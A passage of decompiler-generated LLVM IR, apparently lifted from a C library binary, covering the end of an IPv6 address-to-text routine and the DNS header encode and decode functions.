dec_label_pc_11a74:                               ; preds = %dec_label_pc_11a5c, %dec_label_pc_11a6c
  %v0_11a5c13 = phi i32 [ %v0_11a6c, %dec_label_pc_11a6c ], [ %v0_11a5c, %dec_label_pc_11a5c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %bb, %.thread, %dec_label_pc_11a54, %dec_label_pc_11a74
  %v0_11aa0 = phi i32 [ %v0_11a6c, %.thread ], [ %v0_11a78, %bb ], [ %v0_11a6c, %dec_label_pc_11a54 ], [ -1, %dec_label_pc_11a74 ]
  %v0_11a408 = phi i32 [ %v0_11a40, %.thread ], [ %v0_11a78, %bb ], [ -1, %dec_label_pc_11a54 ], [ -1, %dec_label_pc_11a74 ]
  %v0_11a8c = phi i32 [ %v0_11a5c, %.thread ], [ %v0_11a5c, %bb ], [ %v0_11a5c, %dec_label_pc_11a54 ], [ %v0_11a5c13, %dec_label_pc_11a74 ]
  %v1_11a78 = add nuw nsw i32 %v0_11a78, 1
  store i32 %v1_11a78, i32* %r1.global-to-local, align 4
  %v7_11a80 = icmp slt i32 %v1_11a78, 8
  br i1 %v7_11a80, label %dec_label_pc_11a2c, label %dec_label_pc_11a84

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11a78
  %v7_11a84 = icmp eq i32 %v0_11aa0, -1
  br i1 %v7_11a84, label %dec_label_pc_11aa4, label %dec_label_pc_11a8c

dec_label_pc_11a8c:                               ; preds = %dec_label_pc_11a84
  %v7_11a8c = icmp eq i32 %v0_11a8c, -1
  %v0_11a9c.pre = load i32, i32* @r4, align 4
  br i1 %v7_11a8c, label %dec_label_pc_11a9c, label %dec_label_pc_11a94

dec_label_pc_11a94:                               ; preds = %dec_label_pc_11a8c
  %v1_11a94 = load i32, i32* @r7, align 4
  %v7_11a98 = icmp sgt i32 %v0_11a9c.pre, %v1_11a94
  br i1 %v7_11a98, label %dec_label_pc_11a9c, label %dec_label_pc_11aa4

dec_label_pc_11a9c:                               ; preds = %dec_label_pc_11a8c, %dec_label_pc_11a94
  store i32 %v0_11a9c.pre, i32* @r7, align 4
  store i32 %v0_11aa0, i32* @r6, align 4
  br label %dec_label_pc_11aa4

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a94, %dec_label_pc_11a84, %dec_label_pc_11a9c
  %v0_11aa4 = phi i32 [ %v0_11a8c, %dec_label_pc_11a94 ], [ %v0_11a8c, %dec_label_pc_11a84 ], [ %v0_11aa0, %dec_label_pc_11a9c ]
  %v7_11aa4 = icmp eq i32 %v0_11aa4, -1
  br i1 %v7_11aa4, label %bb49, label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aa4
  %v0_11aac = load i32, i32* @r7, align 4
  %v7_11ab0 = icmp slt i32 %v0_11aac, 2
  br i1 %v7_11ab0, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_11aac
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_11aa4, %dec_label_pc_11aac, %bb48
  %v0_11ac023 = phi i32 [ %v0_11aa4, %dec_label_pc_11aa4 ], [ %v0_11aa4, %dec_label_pc_11aac ], [ -1, %bb48 ]
  %v2_11ab4 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_11ab4, i32* @r4, align 4
  %v9_11b20 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_11ac063 = icmp eq i32 %v0_11ac023, -1
  br label %dec_label_pc_11ac0

dec_label_pc_11ac0:                               ; preds = %bb49, %dec_label_pc_11b74
  %v7_11ac067 = phi i1 [ %v7_11ac063, %bb49 ], [ %v7_11ac0, %dec_label_pc_11b74 ]
  %v0_11aec66 = phi i32 [ 0, %bb49 ], [ %v1_11b74, %dec_label_pc_11b74 ]
  %v1_11adc65 = phi i32 [ %v0_11ac023, %bb49 ], [ %v0_11ac0.pre, %dec_label_pc_11b74 ]
  %v3_11af464 = phi i32 [ %v2_11ab4, %bb49 ], [ %v3_11ae424, %dec_label_pc_11b74 ]
  br i1 %v7_11ac067, label %dec_label_pc_11aec, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11ac0
  %v9_11ac8 = icmp eq i32 %v0_11aec66, %v1_11adc65
  %v5_11acc = icmp slt i32 %v0_11aec66, %v1_11adc65
  br i1 %v5_11acc, label %dec_label_pc_11aec, label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11ac8
  %v1_11ad0 = load i32, i32* @r7, align 4
  %v2_11ad0 = add i32 %v1_11ad0, %v1_11adc65
  %v6_11ad8 = icmp slt i32 %v0_11aec66, %v2_11ad0
  br i1 %v6_11ad8, label %dec_label_pc_11adc, label %dec_label_pc_11aec

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11ad0
  br i1 %v9_11ac8, label %bb51, label %dec_label_pc_11b74

bb51:                                             ; preds = %dec_label_pc_11adc
  %v4_11ae4 = inttoptr i32 %v3_11af464 to i8*
  store i8 58, i8* %v4_11ae4, align 1
  %v5_11ae4 = load i32, i32* @r4, align 4
  %v6_11ae4 = add i32 %v5_11ae4, 1
  store i32 %v6_11ae4, i32* @r4, align 4
  br label %dec_label_pc_11b74

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11ad0, %dec_label_pc_11ac8, %dec_label_pc_11ac0
  %v2_11aec = icmp eq i32 %v0_11aec66, 0
  br i1 %v2_11aec, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_11aec
  %v4_11af4 = inttoptr i32 %v3_11af464 to i8*
  store i8 58, i8* %v4_11af4, align 1
  %v5_11af4 = load i32, i32* @r4, align 4
  %v6_11af4 = add i32 %v5_11af4, 1
  store i32 %v6_11af4, i32* @r4, align 4
  %v0_11af8.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11aec, %bb52
  %v0_11b38 = phi i32 [ %v3_11af464, %dec_label_pc_11aec ], [ %v6_11af4, %bb52 ]
  %v1_11b5c = phi i32 [ 0, %dec_label_pc_11aec ], [ %v0_11af8.pre, %bb52 ]
  %v7_11af8 = icmp eq i32 %v1_11b5c, 6
  br i1 %v7_11af8, label %dec_label_pc_11b00, label %dec_label_pc_11b58

dec_label_pc_11b00:                               ; preds = %.thread3
  %v0_11b00 = load i32, i32* @r6, align 4
  %v2_11b00 = icmp eq i32 %v0_11b00, 0
  br i1 %v2_11b00, label %dec_label_pc_11b08, label %dec_label_pc_11b58

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11b00
  %v0_11b08 = load i32, i32* @r7, align 4
  %v7_11b08 = icmp eq i32 %v0_11b08, 6
  br i1 %v7_11b08, label %dec_label_pc_11b28, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b08
  %v7_11b10 = icmp eq i32 %v0_11b08, 5
  br i1 %v7_11b10, label %dec_label_pc_11b18, label %dec_label_pc_11b58

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11b10
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_11b20, label %dec_label_pc_11b28, label %dec_label_pc_11b58

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11b18, %dec_label_pc_11b08
  %v2_11b2c = sub i32 %v25_11998, %v0_11b38
  %v0_11b30 = load i32, i32* @r8, align 4
  %v1_11b30 = add i32 %v0_11b30, 12
  %v1_11b34 = add i32 %v2_11b2c, -32
  store i32 %v1_11b34, i32* %r2.global-to-local, align 4
  store i32 %v0_11b38, i32* %r1.global-to-local, align 4
  %v3_11b3c = call i32 @inet_ntop4(i32 %v1_11b30, i32 %v0_11b38, i32 %v1_11b34)
  %v2_11b40 = icmp eq i32 %v3_11b3c, 0
  br i1 %v2_11b40, label %dec_label_pc_11bcc, label %dec_label_pc_11b48

dec_label_pc_11b48:                               ; preds = %dec_label_pc_11b28
  %v0_11b48 = load i32, i32* @r4, align 4
  %v1_11b48 = inttoptr i32 %v0_11b48 to i8*
  %v3_11b4c = call i32 @strlen(i8* %v1_11b48)
  %v0_11b50 = load i32, i32* @r4, align 4
  %v2_11b50 = add i32 %v0_11b50, %v3_11b4c
  store i32 %v2_11b50, i32* @r4, align 4
  %v0_11b88.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11b88

dec_label_pc_11b58:                               ; preds = %dec_label_pc_11b18, %dec_label_pc_11b10, %dec_label_pc_11b00, %.thread3
  %v4_11b5c = mul i32 %v1_11b5c, 4
  %v5_11b5c = add i32 %v4_11b5c, %v25_11998
  store i32 %v0_11b38, i32* @r0, align 4
  %v1_11b64 = add i32 %v5_11b5c, -32
  %v2_11b64 = inttoptr i32 %v1_11b64 to i32*
  %v3_11b64 = load i32, i32* %v2_11b64, align 4
  store i32 %v3_11b64, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14a40.741 to i32), i32* %r1.global-to-local, align 4
  %v5_11b6c = call i32 @sprintf(i32 %v0_11b38, i32 ptrtoint ([3 x i8]* @global_var_14a40.741 to i32), i32 %v3_11b64, i32 %v5_11b5c)
  %v0_11b70 = load i32, i32* @r4, align 4
  %v2_11b70 = add i32 %v0_11b70, %v5_11b6c
  store i32 %v2_11b70, i32* @r4, align 4
  br label %dec_label_pc_11b74

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11adc, %bb51, %dec_label_pc_11b58
  %v3_11ae424 = phi i32 [ %v3_11af464, %dec_label_pc_11adc ], [ %v6_11ae4, %bb51 ], [ %v2_11b70, %dec_label_pc_11b58 ]
  %v0_11b74 = load i32, i32* @r5, align 4
  %v1_11b74 = add i32 %v0_11b74, 1
  %v0_11ac0.pre = load i32, i32* @r6, align 4
  store i32 %v1_11b74, i32* @r5, align 4
  %v7_11b7c = icmp slt i32 %v1_11b74, 8
  %v7_11ac0 = icmp eq i32 %v0_11ac0.pre, -1
  br i1 %v7_11b7c, label %dec_label_pc_11ac0, label %dec_label_pc_11b80

dec_label_pc_11b80:                               ; preds = %dec_label_pc_11b74
  br i1 %v7_11ac0, label %.thread4, label %dec_label_pc_11b88

dec_label_pc_11b88:                               ; preds = %dec_label_pc_11b80, %dec_label_pc_11b48
  %v3_11b94 = phi i32 [ %v3_11ae424, %dec_label_pc_11b80 ], [ %v2_11b50, %dec_label_pc_11b48 ]
  %v0_11b88 = phi i32 [ %v0_11ac0.pre, %dec_label_pc_11b80 ], [ %v0_11b88.pre, %dec_label_pc_11b48 ]
  %v1_11b88 = load i32, i32* @r7, align 4
  %v2_11b88 = add i32 %v1_11b88, %v0_11b88
  %v7_11b8c = icmp eq i32 %v2_11b88, 8
  br i1 %v7_11b8c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_11b88
  %v4_11b94 = inttoptr i32 %v3_11b94 to i8*
  store i8 58, i8* %v4_11b94, align 1
  %v5_11b94 = load i32, i32* @r4, align 4
  %v6_11b94 = add i32 %v5_11b94, 1
  store i32 %v6_11b94, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11b88, %dec_label_pc_11b80, %bb53
  %v2_11b9c = phi i32 [ %v3_11b94, %dec_label_pc_11b88 ], [ %v3_11ae424, %dec_label_pc_11b80 ], [ %v6_11b94, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_11b9c = inttoptr i32 %v2_11b9c to i8*
  store i8 0, i8* %v3_11b9c, align 1
  %v4_11b9c = load i32, i32* @r4, align 4
  %v5_11b9c = add i32 %v4_11b9c, 1
  store i32 %v2_11ab4, i32* %r1.global-to-local, align 4
  %v2_11ba4 = sub i32 %v5_11b9c, %v2_11ab4
  %v1_11ba8 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_11ba4, %v1_11ba8
  br i1 %tmp69, label %dec_label_pc_11bb0, label %dec_label_pc_11bc4

dec_label_pc_11bb0:                               ; preds = %.thread4
  %v0_11bb0 = call i32 @__errno_location()
  %v0_11bb8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11bb8, i32* %r2.global-to-local, align 4
  %v2_11bbc = inttoptr i32 %v0_11bb0 to i32*
  store i32 28, i32* %v2_11bbc, align 4
  %v0_11be4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11be4

dec_label_pc_11bc4:                               ; preds = %.thread4
  %v0_11bc4 = load i32, i32* @sb, align 4
  %v2_11bc8 = bitcast i32* %stack_var_-110 to i8*
  %v3_11bc8 = call i32 @strcpy(i32 %v0_11bc4, i8* %v2_11bc8)
  br label %dec_label_pc_11bcc

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11b28, %dec_label_pc_119c0, %dec_label_pc_11bc4
  %v0_11bcc = phi i32 [ 0, %dec_label_pc_11b28 ], [ %v3_119cc, %dec_label_pc_119c0 ], [ %v3_11bc8, %dec_label_pc_11bc4 ]
  store i32 %v0_11bcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11be4

dec_label_pc_11bd4:                               ; preds = %dec_label_pc_119b4
  %v0_11bd4 = call i32 @__errno_location()
  %v2_11bdc = inttoptr i32 %v0_11bd4 to i32*
  store i32 97, i32* %v2_11bdc, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11be4

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bcc, %dec_label_pc_11bb0, %dec_label_pc_11bd4
  %v0_11be4 = phi i32 [ %v0_11bcc, %dec_label_pc_11bcc ], [ %v0_11be4.pre, %dec_label_pc_11bb0 ], [ 0, %dec_label_pc_11bd4 ]
  store i32 %v6_11998, i32* %r5.global-to-local, align 4
  ret i32 %v0_11be4

; uselistorder directives
  uselistorder i1 %v7_11ac0, { 1, 0 }
  uselistorder i32 %v0_11ac0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_11b74, { 1, 0, 2 }
  uselistorder i32 %v0_11b38, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_11af464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_11adc65, { 2, 0, 1 }
  uselistorder i32 %v0_11aec66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_11ab4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11ac023, { 1, 0 }
  uselistorder i32 %v0_11aa4, { 1, 2, 0 }
  uselistorder i32 %v1_11a78, { 1, 2, 0 }
  uselistorder i32 %v0_11a8c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11aa0, { 1, 2, 0, 3 }
  uselistorder i1 %v7_11a40, { 1, 0 }
  uselistorder i32 %v0_11a78, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_11a5c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_11a6c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_11a10, { 2, 1, 0 }
  uselistorder i32 %v1_119f0, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_11998, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 2, 3, 6, 0, 1, 7, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 9, 6, 7, 8, 14, 12, 13, 11, 2, 10, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11be4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11bcc, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b74, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_11ac0, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11aa4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a9c, { 1, 0 }
  uselistorder label %dec_label_pc_11a78, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11a74, { 1, 0 }
  uselistorder label %dec_label_pc_11a2c, { 1, 0 }
  uselistorder label %dec_label_pc_11a00, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_11bfc = load i32, i32* @r4, align 4
  store i32 %v3_11bfc, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_11c0c = icmp sgt i32 %arg3, 11
  br i1 %v7_11c0c, label %dec_label_pc_11c10, label %dec_label_pc_11cd8

dec_label_pc_11c10:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_11c10 = add i32 %tmp, 1
  %v2_11c10 = inttoptr i32 %v1_11c10 to i8*
  %v3_11c10 = load i8, i8* %v2_11c10, align 1
  store i8 %v3_11c10, i8* %tmp18, align 1
  %v2_11c18 = load i32, i32* %arg1, align 4
  %v1_11c1c = trunc i32 %v2_11c18 to i8
  %v4_11c1c = add i32 %arg2, 1
  %v5_11c1c = inttoptr i32 %v4_11c1c to i8*
  store i8 %v1_11c1c, i8* %v5_11c1c, align 1
  %v0_11c20 = load i32, i32* %lr.global-to-local, align 4
  %v1_11c20 = add i32 %v0_11c20, 12
  %v2_11c20 = inttoptr i32 %v1_11c20 to i32*
  %v3_11c20 = load i32, i32* %v2_11c20, align 4
  %v1_11c24 = add i32 %v0_11c20, 4
  %v2_11c24 = inttoptr i32 %v1_11c24 to i32*
  %v3_11c24 = load i32, i32* %v2_11c24, align 4
  %v1_11c28 = add i32 %v0_11c20, 16
  %v2_11c28 = inttoptr i32 %v1_11c28 to i32*
  %v3_11c28 = load i32, i32* %v2_11c28, align 4
  %v1_11c2c = add i32 %tmp, 8
  %v2_11c2c = inttoptr i32 %v1_11c2c to i32*
  %v3_11c2c = load i32, i32* %v2_11c2c, align 4
  %v2_11c30 = icmp eq i32 %v3_11c20, 0
  %. = select i1 %v2_11c30, i32 0, i32 4
  %v2_11c3c = icmp eq i32 %v3_11c24, 0
  %v1_11c40 = add i32 %v0_11c20, 20
  %v2_11c40 = inttoptr i32 %v1_11c40 to i32*
  %v3_11c40 = load i32, i32* %v2_11c40, align 4
  store i32 %v3_11c40, i32* @ip, align 4
  %storemerge12 = select i1 %v2_11c3c, i32 0, i32 128
  %v1_11c4c = urem i32 %v3_11c2c, 16
  %v2_11c50 = icmp eq i32 %v3_11c28, 0
  %.29 = select i1 %v2_11c50, i32 0, i32 2
  %v4_11c5c = mul nuw nsw i32 %v1_11c4c, 8
  %v5_11c5c = or i32 %v4_11c5c, %.
  %v2_11c60 = icmp eq i32 %v3_11c40, 0
  br i1 %v2_11c60, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_11c10
  %v2_11c64 = or i32 %v5_11c5c, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_11c10, %bb25
  %v1_11c6c = phi i32 [ %v5_11c5c, %dec_label_pc_11c10 ], [ %v2_11c64, %bb25 ]
  %v2_11c68 = or i32 %.29, %storemerge12
  %v2_11c6c = or i32 %v2_11c68, %v1_11c6c
  %v1_11c70 = trunc i32 %v2_11c6c to i8
  %v2_11c70 = load i32, i32* %r4.global-to-local, align 4
  %v3_11c70 = add i32 %v2_11c70, 2
  %v4_11c70 = inttoptr i32 %v3_11c70 to i8*
  store i8 %v1_11c70, i8* %v4_11c70, align 1
  %v0_11c74 = load i32, i32* %lr.global-to-local, align 4
  %v1_11c74 = add i32 %v0_11c74, 24
  %v1_11c78 = inttoptr i32 %v1_11c74 to i32*
  %v2_11c78 = load i32, i32* %v1_11c78, align 4
  %v3_11c78 = add i32 %v0_11c74, 28
  %v4_11c78 = inttoptr i32 %v3_11c78 to i32*
  %v5_11c78 = load i32, i32* %v4_11c78, align 4
  %v2_11c7c = icmp eq i32 %v2_11c78, 0
  %v1_11c80 = urem i32 %v5_11c78, 16
  %.30 = select i1 %v2_11c7c, i32 0, i32 128
  %v2_11c8c = or i32 %v1_11c80, %.30
  %v1_11c90 = trunc i32 %v2_11c8c to i8
  %v2_11c90 = load i32, i32* %r4.global-to-local, align 4
  %v3_11c90 = add i32 %v2_11c90, 3
  %v4_11c90 = inttoptr i32 %v3_11c90 to i8*
  store i8 %v1_11c90, i8* %v4_11c90, align 1
  %v0_11c94 = load i32, i32* %lr.global-to-local, align 4
  %v1_11c94 = add i32 %v0_11c94, 33
  %v2_11c94 = inttoptr i32 %v1_11c94 to i8*
  %v3_11c94 = load i8, i8* %v2_11c94, align 1
  %v2_11c98 = load i32, i32* %r4.global-to-local, align 4
  %v3_11c98 = add i32 %v2_11c98, 4
  %v4_11c98 = inttoptr i32 %v3_11c98 to i8*
  store i8 %v3_11c94, i8* %v4_11c98, align 1
  %v0_11c9c = load i32, i32* %lr.global-to-local, align 4
  %v1_11c9c = add i32 %v0_11c9c, 32
  %v2_11c9c = inttoptr i32 %v1_11c9c to i32*
  %v3_11c9c = load i32, i32* %v2_11c9c, align 4
  %v1_11ca0 = trunc i32 %v3_11c9c to i8
  %v2_11ca0 = load i32, i32* %r4.global-to-local, align 4
  %v3_11ca0 = add i32 %v2_11ca0, 5
  %v4_11ca0 = inttoptr i32 %v3_11ca0 to i8*
  store i8 %v1_11ca0, i8* %v4_11ca0, align 1
  %v0_11ca4 = load i32, i32* %lr.global-to-local, align 4
  %v1_11ca4 = add i32 %v0_11ca4, 37
  %v2_11ca4 = inttoptr i32 %v1_11ca4 to i8*
  %v3_11ca4 = load i8, i8* %v2_11ca4, align 1
  %v2_11ca8 = load i32, i32* %r4.global-to-local, align 4
  %v3_11ca8 = add i32 %v2_11ca8, 6
  %v4_11ca8 = inttoptr i32 %v3_11ca8 to i8*
  store i8 %v3_11ca4, i8* %v4_11ca8, align 1
  %v0_11cac = load i32, i32* %lr.global-to-local, align 4
  %v1_11cac = add i32 %v0_11cac, 36
  %v2_11cac = inttoptr i32 %v1_11cac to i32*
  %v3_11cac = load i32, i32* %v2_11cac, align 4
  %v1_11cb0 = trunc i32 %v3_11cac to i8
  %v2_11cb0 = load i32, i32* %r4.global-to-local, align 4
  %v3_11cb0 = add i32 %v2_11cb0, 7
  %v4_11cb0 = inttoptr i32 %v3_11cb0 to i8*
  store i8 %v1_11cb0, i8* %v4_11cb0, align 1
  %v0_11cb4 = load i32, i32* %lr.global-to-local, align 4
  %v1_11cb4 = add i32 %v0_11cb4, 41
  %v2_11cb4 = inttoptr i32 %v1_11cb4 to i8*
  %v3_11cb4 = load i8, i8* %v2_11cb4, align 1
  %v2_11cb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_11cb8 = add i32 %v2_11cb8, 8
  %v4_11cb8 = inttoptr i32 %v3_11cb8 to i8*
  store i8 %v3_11cb4, i8* %v4_11cb8, align 1
  %v0_11cbc = load i32, i32* %lr.global-to-local, align 4
  %v1_11cbc = add i32 %v0_11cbc, 40
  %v2_11cbc = inttoptr i32 %v1_11cbc to i32*
  %v3_11cbc = load i32, i32* %v2_11cbc, align 4
  %v1_11cc0 = trunc i32 %v3_11cbc to i8
  %v2_11cc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_11cc0 = add i32 %v2_11cc0, 9
  %v4_11cc0 = inttoptr i32 %v3_11cc0 to i8*
  store i8 %v1_11cc0, i8* %v4_11cc0, align 1
  %v0_11cc4 = load i32, i32* %lr.global-to-local, align 4
  %v1_11cc4 = add i32 %v0_11cc4, 45
  %v2_11cc4 = inttoptr i32 %v1_11cc4 to i8*
  %v3_11cc4 = load i8, i8* %v2_11cc4, align 1
  %v2_11cc8 = load i32, i32* %r4.global-to-local, align 4
  %v3_11cc8 = add i32 %v2_11cc8, 10
  %v4_11cc8 = inttoptr i32 %v3_11cc8 to i8*
  store i8 %v3_11cc4, i8* %v4_11cc8, align 1
  %v0_11ccc = load i32, i32* %lr.global-to-local, align 4
  %v1_11ccc = add i32 %v0_11ccc, 44
  %v2_11ccc = inttoptr i32 %v1_11ccc to i32*
  %v3_11ccc = load i32, i32* %v2_11ccc, align 4
  %v1_11cd0 = trunc i32 %v3_11ccc to i8
  %v2_11cd0 = load i32, i32* %r4.global-to-local, align 4
  %v3_11cd0 = add i32 %v2_11cd0, 11
  %v4_11cd0 = inttoptr i32 %v3_11cd0 to i8*
  store i8 %v1_11cd0, i8* %v4_11cd0, align 1
  %v2_11cdc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %entry, %bb26
  %v2_11cdc = phi i32 [ %v3_11bfc, %entry ], [ %v2_11cdc.pre, %bb26 ]
  %v0_11cd8 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_11cdc, i32* @r4, align 4
  ret i32 %v0_11cd8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11cd8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_11ce0 = load i8, i8* %arg1, align 1
  %v4_11ce0 = zext i8 %v3_11ce0 to i32
  %v2_11ce4 = add i32 %tmp, 1
  %v3_11ce4 = inttoptr i32 %v2_11ce4 to i8*
  %v4_11ce4 = load i8, i8* %v3_11ce4, align 1
  %v5_11ce4 = zext i8 %v4_11ce4 to i32
  %v4_11ce8 = mul nuw nsw i32 %v4_11ce0, 256
  %v5_11ce8 = or i32 %v5_11ce4, %v4_11ce8
  %v2_11cec = inttoptr i32 %arg2 to i32*
  store i32 %v5_11ce8, i32* %v2_11cec, align 4
  %v2_11cf0 = add i32 %tmp, 2
  %v3_11cf0 = inttoptr i32 %v2_11cf0 to i8*
  %v4_11cf0 = load i8, i8* %v3_11cf0, align 1
  %tmp4 = icmp slt i8 %v4_11cf0, 0
  %v3_11cf4 = zext i1 %tmp4 to i32
  %v2_11cf8 = add i32 %arg2, 4
  %v3_11cf8 = inttoptr i32 %v2_11cf8 to i32*
  store i32 %v3_11cf4, i32* %v3_11cf8, align 4
  %v4_11cfc = load i8, i8* %v3_11cf0, align 1
  %div = udiv i8 %v4_11cfc, 8
  %tmp5 = urem i8 %div, 16
  %v1_11d04 = zext i8 %tmp5 to i32
  %v2_11d08 = add i32 %arg2, 8
  %v3_11d08 = inttoptr i32 %v2_11d08 to i32*
  store i32 %v1_11d04, i32* %v3_11d08, align 4
  %v4_11d0c = load i8, i8* %v3_11cf0, align 1
  %div1 = udiv i8 %v4_11d0c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_11d14 = zext i8 %tmp6 to i32
  %v2_11d18 = add i32 %arg2, 12
  %v3_11d18 = inttoptr i32 %v2_11d18 to i32*
  store i32 %v1_11d14, i32* %v3_11d18, align 4
  %v4_11d1c = load i8, i8* %v3_11cf0, align 1
  %div2 = udiv i8 %v4_11d1c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_11d24 = zext i8 %tmp7 to i32
  %v2_11d28 = add i32 %arg2, 16
  %v3_11d28 = inttoptr i32 %v2_11d28 to i32*
  store i32 %v1_11d24, i32* %v3_11d28, align 4
  %v4_11d2c = load i8, i8* %v3_11cf0, align 1
  %tmp8 = urem i8 %v4_11d2c, 2
  %v1_11d30 = zext i8 %tmp8 to i32
  %v2_11d34 = add i32 %arg2, 20
  %v3_11d34 = inttoptr i32 %v2_11d34 to i32*
  store i32 %v1_11d30, i32* %v3_11d34, align 4
  %v2_11d38 = add i32 %tmp, 3
  %v3_11d38 = inttoptr i32 %v2_11d38 to i8*
  %v4_11d38 = load i8, i8* %v3_11d38, align 1
  %tmp9 = icmp slt i8 %v4_11d38, 0
  %v3_11d3c = zext i1 %tmp9 to i32
  %v2_11d40 = add i32 %arg2, 24
  %v3_11d40 = inttoptr i32 %v2_11d40 to i32*
  store i32 %v3_11d3c, i32* %v3_11d40, align 4
  %v4_11d44 = load i8, i8* %v3_11d38, align 1
  %tmp10 = urem i8 %v4_11d44, 16
  %v1_11d48 = zext i8 %tmp10 to i32
  %v2_11d4c = add i32 %arg2, 28
  %v3_11d4c = inttoptr i32 %v2_11d4c to i32*
  store i32 %v1_11d48, i32* %v3_11d4c, align 4
  %v2_11d50 = add i32 %tmp, 4
  %v3_11d50 = inttoptr i32 %v2_11d50 to i8*
  %v4_11d50 = load i8, i8* %v3_11d50, align 1
  %v5_11d50 = zext i8 %v4_11d50 to i32
  %v2_11d54 = add i32 %tmp, 5
  %v3_11d54 = inttoptr i32 %v2_11d54 to i8*
  %v4_11d54 = load i8, i8* %v3_11d54, align 1
  %v5_11d54 = zext i8 %v4_11d54 to i32
  %v4_11d58 = mul nuw nsw i32 %v5_11d50, 256
  %v5_11d58 = or i32 %v5_11d54, %v4_11d58
  %v2_11d5c = add i32 %arg2, 32
  %v3_11d5c = inttoptr i32 %v2_11d5c to i32*
  store i32 %v5_11d58, i32* %v3_11d5c, align 4
  %v2_11d60 = add i32 %tmp, 6
  %v3_11d60 = inttoptr i32 %v2_11d60 to i8*
  %v4_11d60 = load i8, i8* %v3_11d60, align 1
